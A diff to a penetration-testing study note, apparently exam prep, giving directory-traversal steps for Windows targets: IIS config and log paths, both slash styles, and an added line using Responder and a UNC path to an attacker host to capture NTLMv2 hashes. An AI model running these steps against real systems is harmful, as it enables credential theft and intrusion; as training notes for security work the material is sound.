@@ -21,6 +21,7 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for directory traversal, L
 ### Traversal confirmed, target is Windows
 → No direct "read passwd, find key" path on Windows. Check IIS-specific locations: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`
 → Try both `../` and `..\`
+→ If a UNC path is accepted, start Responder and request `\\$LocalIP\share\probe` to capture the target's NTLMv2 response
 → See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]
 
 ### You have LFI and want to read PHP source (not execute it)
